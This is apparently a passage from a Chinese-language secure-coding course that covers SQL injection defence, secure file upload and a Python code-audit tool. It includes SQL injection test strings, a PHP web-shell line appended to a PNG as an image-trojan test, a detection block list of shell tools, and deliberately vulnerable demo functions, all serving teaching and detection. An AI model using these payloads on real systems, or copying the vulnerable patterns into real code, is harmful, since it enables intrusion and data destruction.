        # session.execute(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def django_safe():
        """Django ORM安全用法"""
        # 安全：使用参数化
        # User.objects.filter(username=username)
        
        # 危险：使用raw()拼接
        # User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def peewee_safe():
        """Peewee ORM安全用法"""
        # 安全：使用参数化
        # User.select().where(User.username == username)
        
        # 危险：使用raw()拼接
        # User.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass

class SecureDatabaseAPI:
    """安全的数据库API实现"""
    
    def __init__(self, db_path=':memory:'):
        self.conn = sqlite3.connect(db_path)
        self._init_db()
    
    def _init_db(self):
        """初始化数据库"""
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                price REAL NOT NULL,
                category TEXT
            )
        ''')
        self.conn.commit()
    
    @contextmanager
    def get_cursor(self):
        """获取数据库游标"""
        cursor = self.conn.cursor()
        try:
            yield cursor
            self.conn.commit()
        except Exception as e:
            self.conn.rollback()
            raise e
        finally:
            cursor.close()
    
    def safe_query(self, query, params=None):
        """
        安全的参数化查询
        """
        if params is None:
            params = []
        
        # 检测SQL注入
        for param in params:
            if isinstance(param, str) and SQLInjectionDetector.detect_injection(param):
                raise ValueError(f"检测到SQL注入: {param}")
        
        with self.get_cursor() as cursor:
            cursor.execute(query, params)
            return cursor.fetchall()
    
    def get_user_by_username(self, username):
        """安全地获取用户"""
        query = "SELECT * FROM users WHERE username = ?"
        return self.safe_query(query, (username,))
    
    def search_products(self, keyword, category=None):
        """安全地搜索产品"""
        query = "SELECT * FROM products WHERE name LIKE ?"
        params = [f'%{keyword}%']
        
        if category:
            query += " AND category = ?"
            params.append(category)
        
        return self.safe_query(query, params)
    
    def get_users_paginated(self, limit, offset):
        """分页查询（参数必须为整数）"""
        # 验证参数类型
        if not isinstance(limit, int) or not isinstance(offset, int):
            raise TypeError("limit和offset必须是整数")
        
        query = "SELECT * FROM users LIMIT ? OFFSET ?"
        return self.safe_query(query, (limit, offset))
    
    def get_order_by(self, column, order='ASC'):
        """
        动态排序（使用白名单）
        """
        # 白名单验证
        allowed_columns = ['id', 'username', 'created_at']
        if column not in allowed_columns:
            raise ValueError(f"不支持的排序字段: {column}")
        
        allowed_order = ['ASC', 'DESC']
        if order.upper() not in allowed_order:
            raise ValueError(f"不支持的排序方向: {order}")
        
        # 安全地拼接（已验证的列名）
        query = f"SELECT * FROM users ORDER BY {column} {order}"
        return self.safe_query(query)

class SQLVulnerableApp:
    """存在SQL注入漏洞的应用（用于演示）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.db = SecureDatabaseAPI()
        self._init_test_data()
        self.setup_routes()
    
    def _init_test_data(self):
        """初始化测试数据"""
        # 添加测试用户
        test_users = [
            ('admin', hashlib.md5('admin123'.encode()).hexdigest(), 'admin@example.com'),
            ('alice', hashlib.md5('alice123'.encode()).hexdigest(), 'alice@example.com'),
            ('bob', hashlib.md5('bob123'.encode()).hexdigest(), 'bob@example.com')
        ]
        
        for username, password, email in test_users:
            try:
                self.db.safe_query(
                    "INSERT INTO users (username, password, email) VALUES (?, ?, ?)",
                    (username, password, email)
                )
            except:
                pass
    
    def setup_routes(self):
        @self.app.route('/search')
        def search():
            """安全搜索"""
            keyword = request.args.get('q', '')
            try:
                results = self.db.search_products(keyword)
                return jsonify({'results': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/user/<username>')
        def get_user(username):
            """安全获取用户"""
            try:
                results = self.db.get_user_by_username(username)
                if results:
                    return jsonify({'user': results[0]})
                return jsonify({'error': '用户不存在'}), 404
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/users')
        def list_users():
            """分页列表（安全）"""
            try:
                page = int(request.args.get('page', 1))
                per_page = int(request.args.get('per_page', 10))
                offset = (page - 1) * per_page
                
                results = self.db.get_users_paginated(per_page, offset)
                return jsonify({'users': results, 'page': page})
            except (TypeError, ValueError) as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/sort')
        def sort_users():
            """排序（白名单验证）"""
            column = request.args.get('by', 'id')
            order = request.args.get('order', 'ASC')
            
            try:
                results = self.db.get_order_by(column, order)
                return jsonify({'users': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
    
    def run(self, port=5005):
        self.app.run(debug=True, port=port)

class SQLInjectionDefenseCheatsheet:
    """SQL注入防御速查表"""
    
    @staticmethod
    def best_practices():
        """最佳实践"""
        practices = {
            "DO_use_parameterized_queries": """
                # 正确：使用参数化查询
                cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
            """,
            "DONOT_string_concat": """
                # 错误：字符串拼接
                cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
            """,
            "DO_validate_input_type": """
                # 正确：验证输入类型
                if not isinstance(user_id, int):
                    raise TypeError("ID必须是整数")
            """,
            "DO_use_whitelist_for_dynamic": """
                # 正确：动态表名/列名使用白名单
                allowed_columns = ['id', 'name', 'email']
                if column not in allowed_columns:
                    raise ValueError("无效的列名")
            """,
            "DO_limit_database_privileges": """
                # 正确：使用最小权限原则
                # 应用数据库账户只有SELECT/INSERT/UPDATE权限
            """,
            "DO_use_ORM_safely": """
                # 正确：使用ORM的参数化接口
                User.objects.filter(username=username)
            """
        }
        return practices

def test_sql_injection_detection():
    """测试SQL注入检测"""
    detector = SQLInjectionDetector()
    
    print("="*50)
    print("SQL注入检测测试")
    
    test_cases = [
        ("正常输入", "hello world", False),
        ("引号注入", "admin' OR '1'='1", True),
        ("注释注入", "admin' --", True),
        ("UNION注入", "1 UNION SELECT * FROM users", True),
        ("布尔注入", "1 AND 1=1", True),
        ("时间盲注", "1 AND SLEEP(5)", True),
        ("堆叠查询", "1; DROP TABLE users", True),
        ("编码注入", "%27%20OR%20%271%27=%271", True),
    ]
    
    for name, input_str, expected in test_cases:
        result = detector.detect_injection(input_str)
        status = "✓" if result == expected else "✗"
        print(f"{status} {name}: {result} (预期: {expected})")
        if result:
            print(f"    输入: {input_str[:50]}")

def demo_parameterized_queries():
    """演示参数化查询"""
    print("\n" + "="*50)
    print("参数化查询演示")
    
    # 获取参数化查询示例
    safe_query, unsafe_query = ParameterizedQuery.sqlite_example()
    
    # 正常查询
    print("\n正常查询:")
    print(f"  安全查询: {safe_query('alice')}")
    print(f"  不安全查询: {unsafe_query('alice')}")
    
    # SQL注入攻击演示
    malicious = "admin' OR '1'='1"
    print(f"\n恶意输入: {malicious}")
    
    try:
        result = safe_query(malicious)
        print(f"  安全查询结果: {result} (未注入)")
    except Exception as e:
        print(f"  安全查询错误: {e}")
    
    try:
        result = unsafe_query(malicious)
        print(f"  不安全查询结果: {result} (注入成功)")
    except Exception as e:
        print(f"  不安全查询错误: {e}")

if __name__ == "__main__":
    # 测试SQL注入检测
    test_sql_injection_detection()
    
    # 演示参数化查询
    demo_parameterized_queries()
    
    # 启动安全API
    print("\n" + "="*50)
    print("启动安全数据库API...")
    api_app = SQLVulnerableApp()
    
    import threading
    thread = threading.Thread(target=api_app.run, args=(5005,))
    thread.daemon = True
    thread.start()
    
    print("API运行在 http://127.0.0.1:5005")
    print("\nSQL注入防御最佳实践:")
    for name, practice in SQLInjectionDefenseCheatsheet.best_practices().items():
        print(f"\n{name}:")
        print(practice.strip())

讲解要点：
参数化查询是防御SQL注入最有效的方法
ORM不能自动防御SQL注入，需正确使用参数绑定
动态表名/列名必须使用白名单验证
输入验证与参数化查询结合使用效果更好

课后任务：将现有使用字符串拼接的数据库操作改写为参数化查询。



第7课：文件上传漏洞深度防御

前置知识：第4周内容（文件上传）
下一课衔接：第8课（代码审计实战）

知识点
文件类型多重验证
内容安全检测（魔数、图片检测）
文件名随机化与路径安全
上传目录权限控制
云存储安全上传

代码练习7：安全文件上传系统


"""
secure_file_upload.py
功能：安全的文件上传系统实现
"""

import os
import re
import uuid
import magic
import hashlib
import imghdr
import zipfile
from PIL import Image
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from werkzeug.utils import secure_filename

class SecureFileUpload:
    """安全文件上传处理器"""
    
    # 允许的文件类型（白名单）
    ALLOWED_MIMES = {
        'image/jpeg': 'jpg',
        'image/png': 'png',
        'image/gif': 'gif',
        'image/webp': 'webp',
        'application/pdf': 'pdf',
        'text/plain': 'txt',
        'application/msword': 'doc',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'docx'
    }
    
    # 允许的文件扩展名
    ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf', 'txt', 'doc', 'docx'}
    
    # 最大文件大小（5MB）
    MAX_FILE_SIZE = 5 * 1024 * 1024
    
    # 图片最大尺寸
    MAX_IMAGE_WIDTH = 1920
    MAX_IMAGE_HEIGHT = 1080
    
    def __init__(self, upload_dir='./secure_uploads'):
        self.upload_dir = upload_dir
        self._init_upload_dir()
    
    def _init_upload_dir(self):
        """初始化上传目录"""
        os.makedirs(self.upload_dir, exist_ok=True)
        # 创建.htaccess或nginx配置防止执行
        self._create_security_config()
    
    def _create_security_config(self):
        """创建安全配置文件"""
        # 对于Nginx，建议配置：
        # location /uploads/ {
        #     default_type text/plain;
        #     add_header Content-Disposition 'attachment; filename="$1"';
        # }
        
        # 对于Apache，创建.htaccess
        htaccess_content = """
# 禁止执行PHP、Python等脚本
AddHandler cgi-script .php .php3 .phtml .pl .py .jsp .asp .htm .shtml .sh .cgi
Options -ExecCGI
AddType text/plain .html .htm .shtml .php .phtml .php3 .py .jsp .asp

# 启用内容嗅探保护
Header set X-Content-Type-Options "nosniff"
"""
        htaccess_path = os.path.join(self.upload_dir, '.htaccess')
        if not os.path.exists(htaccess_path):
            with open(htaccess_path, 'w') as f:
                f.write(htaccess_content)
    
    def validate_extension(self, filename):
        """验证文件扩展名"""
        if '.' not in filename:
            return False
        ext = filename.rsplit('.', 1)[1].lower()
        return ext in self.ALLOWED_EXTENSIONS
    
    def validate_mime_type(self, file_content):
        """验证MIME类型（使用python-magic）"""
        mime = magic.from_buffer(file_content, mime=True)
        return mime in self.ALLOWED_MIMES
    
    def validate_image_content(self, file_content):
        """验证图片内容真实性"""
        import io
        try:
            img = Image.open(io.BytesIO(file_content))
            img.verify()  # 验证图片完整性
            
            # 额外检查：重新打开获取尺寸
            img = Image.open(io.BytesIO(file_content))
            width, height = img.size
            
            if width > self.MAX_IMAGE_WIDTH or height > self.MAX_IMAGE_HEIGHT:
                return False, f"图片尺寸超出限制 ({width}x{height})"
            
            # 检查图片格式
            img_format = img.format
            if img_format and img_format.lower() not in ['jpeg', 'png', 'gif', 'webp']:
                return False, f"不支持的图片格式: {img_format}"
            
            return True, "OK"
        except Exception as e:
            return False, f"图片验证失败: {e}"
    
    def validate_pdf_content(self, file_content):
        """验证PDF文件真实性"""
        # PDF文件头：%PDF-
        if not file_content.startswith(b'%PDF-'):
            return False, "无效的PDF文件"
        
        # 简单验证PDF结构
        if b'%%EOF' not in file_content[-20:]:
            return False, "PDF文件不完整"
        
        return True, "OK"
    
    def scan_for_malware(self, file_content, filename):
        """恶意软件扫描（模拟）"""
        # 实际可使用ClamAV等杀毒软件
        # 检查已知恶意特征
        suspicious_patterns = [
            b'<?php', b'<%', b'<script', b'<?=', b'<%@',
            b'powershell', b'cmd.exe', b'/bin/sh', b'system(',
            b'eval(', b'exec(', b'assert(', b'base64_decode'
        ]
        
        for pattern in suspicious_patterns:
            if pattern.lower() in file_content.lower():
                return False, f"检测到可疑内容: {pattern[:20].decode()}"
        
        # 检查zip炸弹
        if filename.endswith('.zip') or filename.endswith('.docx'):
            try:
                import io
                with zipfile.ZipFile(io.BytesIO(file_content)) as zf:
                    total_size = sum(zi.file_size for zi in zf.filelist)
                    if total_size > 100 * 1024 * 1024:  # 100MB限制
                        return False, "检测到Zip炸弹"
            except:
                pass
        
        return True, "OK"
    
    def generate_secure_filename(self, original_filename, file_content):
        """生成安全的文件名"""
        # 计算文件哈希
        file_hash = hashlib.sha256(file_content).hexdigest()[:16]
        
        # 获取扩展名
        ext = original_filename.rsplit('.', 1)[1].lower() if '.' in original_filename else ''
        
        # 使用UUID + 哈希 + 扩展名
        new_filename = f"{uuid.uuid4().hex}_{file_hash}"
        if ext:
            new_filename += f".{ext}"
        
        return new_filename
    
    def process_upload(self, file, metadata=None):
        """
        处理文件上传
        返回: (success, filepath_or_error, details)
        """
        if not file:
            return False, "没有上传文件", None
        
        # 1. 验证文件大小
        file.seek(0, os.SEEK_END)
        size = file.tell()
        file.seek(0)
        
        if size > self.MAX_FILE_SIZE:
            return False, f"文件过大，最大 {self.MAX_FILE_SIZE // 1024 // 1024}MB", None
        
        # 2. 验证文件名
        original_filename = secure_filename(file.filename)
        if not original_filename:
            return False, "无效的文件名", None
        
        # 3. 验证扩展名
        if not self.validate_extension(original_filename):
            return False, f"不允许的文件类型，允许: {', '.join(self.ALLOWED_EXTENSIONS)}", None
        
        # 4. 读取文件内容
        file_content = file.read()
        
        # 5. 验证MIME类型
        if not self.validate_mime_type(file_content):
            return False, "文件MIME类型不允许", None
        
        # 6. 根据文件类型进行内容验证
        mime = magic.from_buffer(file_content, mime=True)
        
        if mime.startswith('image/'):
            valid, msg = self.validate_image_content(file_content)
            if not valid:
                return False, msg, None
        elif mime == 'application/pdf':
            valid, msg = self.validate_pdf_content(file_content)
            if not valid:
                return False, msg, None
        
        # 7. 恶意软件扫描
        valid, msg = self.scan_for_malware(file_content, original_filename)
        if not valid:
            return False, msg, None
        
        # 8. 生成安全文件名
        new_filename = self.generate_secure_filename(original_filename, file_content)
        
        # 9. 保存文件
        filepath = os.path.join(self.upload_dir, new_filename)
        
        # 写入文件
        with open(filepath, 'wb') as f:
            f.write(file_content)
        
        # 10. 生成文件信息
        file_info = {
            'original_name': original_filename,
            'secure_name': new_filename,
            'size': size,
            'mime_type': mime,
            'hash': hashlib.sha256(file_content).hexdigest(),
            'upload_time': __import__('time').time(),
            'metadata': metadata or {}
        }
        
        return True, filepath, file_info

class FileUploadAPI:
    """文件上传API服务"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.uploader = SecureFileUpload()
        self.upload_records = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>安全文件上传系统</h2>
            <form method="post" action="/upload" enctype="multipart/form-data">
                <input type="file" name="file" accept="image/*,.pdf,.txt"><br>
                <input type="text" name="description" placeholder="文件描述"><br>
                <input type="submit" value="上传">
            </form>
            <a href="/files">查看已上传文件</a>
            '''
        
        @self.app.route('/upload', methods=['POST'])
        def upload():
            file = request.files.get('file')
            description = request.form.get('description', '')
            
            success, result, info = self.uploader.process_upload(file, {'description': description})
            
            if success:
                self.upload_records.append(info)
                return jsonify({
                    'success': True,
                    'message': '上传成功',
                    'file': info
                })
            else:
                return jsonify({
                    'success': False,
                    'message': result
                }), 400
        
        @self.app.route('/files')
        def list_files():
            html = '<h2>已上传文件列表</h2><ul>'
            for record in self.upload_records:
                html += f'''
                <li>
                    {record['original_name']} 
                    ({record['size']} bytes) 
                    - {record['mime_type']}
                    <br>哈希: {record['hash'][:16]}...
                </li>
                '''
            html += '</ul><a href="/">返回</a>'
            return html
        
        @self.app.route('/download/<filename>')
        def download(filename):
            # 安全检查：只允许下载已记录的文件
            secure_names = [r['secure_name'] for r in self.upload_records]
            if filename not in secure_names:
                return "文件不存在", 404
            return send_from_directory(self.uploader.upload_dir, filename, as_attachment=True)
    
    def run(self, port=5006):
        self.app.run(debug=True, port=port)

class FileUploadSecurityChecker:
    """文件上传安全检测器"""
    
    @staticmethod
    def test_image_payload():
        """测试图片马检测"""
        # 创建测试图片马
        from PIL import Image
        import io
        
        img = Image.new('RGB', (100, 100), color='red')
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        
        # 在图片末尾添加PHP代码
        img_data = img_bytes.getvalue()
        malicious_code = b'<?php system($_GET["cmd"]); ?>'
        test_content = img_data + malicious_code
        
        return test_content
    
    @staticmethod
    def test_file_upload_vulnerabilities():
        """测试文件上传漏洞"""
        uploader = SecureFileUpload()
        
        print("="*50)
        print("文件上传安全检测")
        
        # 测试1：图片马检测
        print("\n测试1 - 图片马检测")
        img_malware = FileUploadSecurityChecker.test_image_payload()
        valid, msg = uploader.validate_image_content(img_malware[:100000])
        print(f"  图片验证结果: {valid}, {msg}")
        
        # 测试2：扩展名绕过
        print("\n测试2 - 扩展名绕过测试")
        test_cases = [
            ('shell.php', False),
            ('shell.php.jpg', False),
            ('shell.png', True),
            ('shell.PHP', False),
        ]
        for filename, expected in test_cases:
            result = uploader.validate_extension(filename)
            status = "✓" if result == expected else "✗"
            print(f"  {status} {filename}: {result} (预期: {expected})")
        
        # 测试3：恶意代码检测
        print("\n测试3 - 恶意代码检测")
        test_contents = [
            (b'<?php system("id"); ?>', 'PHP代码', False),
            (b'<script>alert(1)</script>', 'JavaScript', False),
            (b'This is normal text', '正常文本', True),
            (b'powershell -exec bypass', 'PowerShell', False),
        ]
        for content, name, expected in test_contents:
            valid, msg = uploader.scan_for_malware(content, 'test.txt')
            status = "✓" if valid == expected else "✗"
            print(f"  {status} {name}: {valid} (预期: {expected}) - {msg}")

def main():
    """主函数"""
    # 运行安全检测
    FileUploadSecurityChecker.test_file_upload_vulnerabilities()
    
    # 启动文件上传API
    print("\n" + "="*50)
    print("启动安全文件上传系统...")
    
    api = FileUploadAPI()
    
    import threading
    thread = threading.Thread(target=api.run, args=(5006,))
    thread.daemon = True
    thread.start()
    
    print("上传系统运行在 http://127.0.0.1:5006")
    print("\n文件上传安全最佳实践:")
    print("1. 使用白名单验证文件类型")
    print("2. 检测文件真实内容（MIME、魔数）")
    print("3. 图片文件重新编码，移除EXIF中的恶意代码")
    print("4. 使用随机文件名，避免路径遍历")
    print("5. 上传目录禁止执行脚本")
    print("6. 使用CDN或云存储，分离存储与执行")

if __name__ == "__main__":
    main()

讲解要点：
文件类型验证必须多层：扩展名+MIME+内容魔数
图片文件应重新编码或使用安全库验证
文件名必须随机化，避免路径遍历
上传目录必须禁止执行脚本
考虑使用云存储服务分离文件存储与执行环境

课后任务：实现一个支持多种文件类型的安全上传组件。



第8课：代码审计实战

前置知识：第5-7课
下一课衔接：第9课（应急响应基础）

知识点
静态代码审计方法论
常见漏洞模式识别
自动化审计工具
审计报告编写

代码练习8：自动化代码审计工具


"""
code_audit_tool.py
功能：Python代码安全审计工具
"""

import ast
import re
import os
import json
from pathlib import Path
from collections import defaultdict
import sys

class SecurityViolation:
    """安全违规信息"""
    
    SEVERITY_CRITICAL = "CRITICAL"
    SEVERITY_HIGH = "HIGH"
    SEVERITY_MEDIUM = "MEDIUM"
    SEVERITY_LOW = "LOW"
    
    def __init__(self, rule_id, severity, description, line_no, code_snippet):
        self.rule_id = rule_id
        self.severity = severity
        self.description = description
        self.line_no = line_no
        self.code_snippet = code_snippet
    
    def to_dict(self):
        return {
            'rule_id': self.rule_id,
            'severity': self.severity,
            'description': self.description,
            'line': self.line_no,
            'code': self.code_snippet.strip()
        }

class PythonCodeAuditor(ast.NodeVisitor):
    """Python代码审计器"""
    
    # SQL注入检测规则
    SQL_INJECTION_PATTERNS = [
        r'cursor\.execute\(f?["\'].*?\+.*?["\']',
        r'cursor\.execute\(["\'].*?%.*?["\']\s*%',
        r'execute\(f?["\'].*?\{.*?\}.*?["\']',
        r'raw\(f?["\'].*?\{.*?\}.*?["\']',
    ]
    
    # 命令注入检测规则
    COMMAND_INJECTION_PATTERNS = [
        r'os\.system\(.*?\+.*?\)',
        r'subprocess\.(call|Popen|run)\(.*?\+.*?\)',
        r'eval\(.*?\+.*?\)',
        r'exec\(.*?\+.*?\)',
        r'__import__\(.*?\+.*?\)',
    ]
    
    # 路径遍历检测规则
    PATH_TRAVERSAL_PATTERNS = [
        r'\.\./',
        r'\.\.\\',
        r'os\.path\.join\(.*?\.\.',
        r'open\(.*?\+.*?\)',
    ]
    
    # 硬编码凭证检测
    CREDENTIAL_PATTERNS = [
        (r'password\s*=\s*["\'][^\'"]+["\']', 'password'),
        (r'secret\s*=\s*["\'][^\'"]+["\']', 'secret'),
        (r'api_key\s*=\s*["\'][^\'"]+["\']', 'api_key'),
        (r'token\s*=\s*["\'][^\'"]+["\']', 'token'),
        (r'key\s*=\s*["\'][^\'"]{16,}["\']', 'key'),
    ]
    
    def __init__(self):
        self.violations = []
        self.current_file = ""
        self.current_lines = []
    
    def audit_file(self, filepath):
        """审计单个文件"""
        self.current_file = filepath
        self.violations = []
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                self.current_lines = content.split('\n')
            
            # 执行AST分析
            tree = ast.parse(content)
            self.visit(tree)
            
            # 执行正则模式匹配
            self.scan_patterns(content)
            
            return self.violations
        except SyntaxError as e:
            violation = SecurityViolation(
                "SYNTAX_ERROR", SecurityViolation.SEVERITY_MEDIUM,
                f"语法错误: {e}", e.lineno, self.current_lines[e.lineno-1] if e.lineno else ""
            )
            return [violation]
        except Exception as e:
            print(f"Error auditing {filepath}: {e}")
            return []
    
    def scan_patterns(self, content):
        """使用正则模式扫描"""
        # SQL注入扫描
        for pattern in self.SQL_INJECTION_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "SQLI-001", SecurityViolation.SEVERITY_CRITICAL,
                    "检测到SQL注入风险：使用了字符串拼接构建SQL查询",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 命令注入扫描
        for pattern in self.COMMAND_INJECTION_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "CMDI-001", SecurityViolation.SEVERITY_CRITICAL,
                    "检测到命令注入风险：使用了字符串拼接执行系统命令",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 路径遍历扫描
        for pattern in self.PATH_TRAVERSAL_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "PT-001", SecurityViolation.SEVERITY_HIGH,
                    "检测到路径遍历风险：用户输入可能被用于路径拼接",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 硬编码凭证扫描
        for pattern, cred_type in self.CREDENTIAL_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "HARDCODE-001", SecurityViolation.SEVERITY_HIGH,
                    f"检测到硬编码{cred_type}",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
    
    def visit_Call(self, node):
        """访问函数调用节点"""
        # 检测危险函数
        dangerous_funcs = ['eval', 'exec', 'compile', '__import__']
        
        if isinstance(node.func, ast.Name):
            func_name = node.func.id
            if func_name in dangerous_funcs:
                violation = SecurityViolation(
                    "DANGER-001", SecurityViolation.SEVERITY_CRITICAL,
                    f"使用了危险函数: {func_name}()",
                    node.lineno, self.current_lines[node.lineno-1]
                )
                self.violations.append(violation)
        
        self.generic_visit(node)
    
    def visit_Import(self, node):
        """访问导入节点"""
        # 检测危险模块导入
        dangerous_modules = ['pickle', 'marshal', 'socket', 'subprocess', 'os', 'sys']
        
        for alias in node.names:
            if alias.name.split('.')[0] in dangerous_modules:
                violation = SecurityViolation(
                    "IMPORT-001", SecurityViolation.SEVERITY_MEDIUM,
                    f"导入了可能危险的模块: {alias.name}",
                    node.lineno, self.current_lines[node.lineno-1]
                )
                self.violations.append(violation)
        
        self.generic_visit(node)
    
    def visit_Assign(self, node):
        """访问赋值节点"""
        # 检测敏感的变量名赋值
        sensitive_names = ['password', 'secret', 'token', 'api_key', 'key']
        
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                for sensitive in sensitive_names:
                    if sensitive in var_name:
                        # 检查是否从环境变量读取
                        if isinstance(node.value, ast.Call):
                            continue
                        
                        violation = SecurityViolation(
                            "SENSITIVE-001", SecurityViolation.SEVERITY_MEDIUM,
                            f"敏感变量 {target.id} 可能被硬编码",
                            node.lineno, self.current_lines[node.lineno-1]
                        )
                        self.violations.append(violation)
                        break
        
        self.generic_visit(node)

class WebAppAuditor:
    """Web应用安全审计器"""
    
    # Flask特有风险
    FLASK_RISK_PATTERNS = [
        (r'app\.secret_key\s*=\s*["\'][^\'"]{1,32}["\']', '弱密钥风险'),
        (r'debug\s*=\s*True', '调试模式开启'),
        (r'@app\.route.*methods=\[.*GET.*\]', 'GET方法敏感操作'),
        (r'jsonify\(.*request\.args', '潜在的JSON注入'),
    ]
    
    # Django特有风险
    DJANGO_RISK_PATTERNS = [
        (r'DEBUG\s*=\s*True', '调试模式开启'),
        (r'ALLOWED_HOSTS\s*=\s*\[\s*\]', '允许所有主机'),
        (r'@csrf_exempt', 'CSRF保护禁用'),
        (r'raw\(', '原始SQL查询'),
    ]
    
    @staticmethod
    def audit_web_app(framework='flask'):
        """审计Web应用"""
        patterns = WebAppAuditor.FLASK_RISK_PATTERNS if framework == 'flask' else WebAppAuditor.DJANGO_RISK_PATTERNS
        return patterns

class AuditReportGenerator:
    """审计报告生成器"""
    
    @staticmethod
    def generate_html_report(violations, output_file='audit_report.html'):
        """生成HTML报告"""
        # 按严重性分组
        grouped = defaultdict(list)
        for v in violations:
            grouped[v.severity].append(v)
        
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>代码安全审计报告</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1 {{ color: #333; }}
                .summary {{ background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                .critical {{ background: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .high {{ background: #fff3e0; border-left: 4px solid #ff9800; padding: 10px; margin: 10px 0; }}
                .medium {{ background: #e8f5e9; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                .low {{ background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; }}
                .code {{ font-family: monospace; background: #eee; padding: 5px; margin: 5px 0; white-space: pre-wrap; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
            </style>
        </head>
        <body>
            <h1>代码安全审计报告</h1>
            
            <div class="summary">
                <h2>审计摘要</h2>
                <p>总漏洞数: {len(violations)}</p>
        '''
        
        for severity in severity_order:
            count = len(grouped.get(severity, []))
            html += f'<p>{severity}: {count}</p>'
        
        html += '''
            </div>
            
            <h2>漏洞详情</h2>
        '''
        
        for severity in severity_order:
            for v in grouped.get(severity, []):
                html += f'''
                <div class="{severity.lower()}">
                    <strong>[{v.severity}] {v.rule_id}</strong>
                    <p>{v.description}</p>
                    <div class="code">第 {v.line_no} 行: {v.code_snippet}</div>
                </div>
                '''
        
        html += '''
        </body>
        </html>
        '''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"报告已生成: {output_file}")

class VulnerableCodeDemo:
    """存在安全问题的示例代码（用于审计测试）"""
    
    @staticmethod
    def vulnerable_sql():
        """不安全的SQL查询"""
        def get_user(user_id):
            import sqlite3
            conn = sqlite3.connect('db.sqlite')
            cursor = conn.cursor()
            # 漏洞：字符串拼接
            query = f"SELECT * FROM users WHERE id = {user_id}"
            cursor.execute(query)
            return cursor.fetchone()
        return get_user
    
    @staticmethod
    def vulnerable_command():
        """不安全的命令执行"""
        import os
        def ping(ip):
            # 漏洞：命令注入
            os.system(f"ping -c 4 {ip}")
        return ping
    
    @staticmethod
    def vulnerable_path():
        """不安全的文件读取"""
        import os
        def read_file(filename):
            # 漏洞：路径遍历
            with open(f"./uploads/{filename}", 'r') as f:
                return f.read()
        return read_file
    
    @staticmethod
    def vulnerable_code():
        """不安全代码示例文件"""
        code = '''
import sqlite3
import os
import subprocess

# SQL注入漏洞
def get_user(user_id):
    conn = sqlite3.connect('db.sqlite')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# 命令注入漏洞
def ping_host(ip):
    os.system(f"ping -c 4 {ip}")

# 硬编码密码
PASSWORD = "admin123"
API_KEY = "sk-1234567890abcdef"

# 路径遍历漏洞
def read_config(filename):
    with open(f"/app/config/{filename}", 'r') as f:
        return f.read()

# 危险函数使用
def eval_input(data):
    return eval(data)

# 调试模式
DEBUG = True
app.secret_key = "weak_secret"
'''
        return code

def run_audit_demo():
    """运行审计演示"""
    print("="*50)
    print("代码安全审计演示")
    
    # 创建临时审计文件
    temp_file = "temp_vulnerable_code.py"
    with open(temp_file, 'w') as f:
        f.write(VulnerableCodeDemo.vulnerable_code())
    
    # 执行审计
    auditor = PythonCodeAuditor()
    violations = auditor.audit_file(temp_file)
    
    print(f"\n发现 {len(violations)} 个安全问题:")
    for v in violations:
        print(f"\n[{v.severity}] {v.rule_id}")
        print(f"  行 {v.line_no}: {v.description}")
        print(f"  代码: {v.code_snippet[:80]}...")
    
    # 生成报告
    AuditReportGenerator.generate_html_report(violations, 'audit_demo_report.html')
    
    # 清理
    os.remove(temp_file)
    
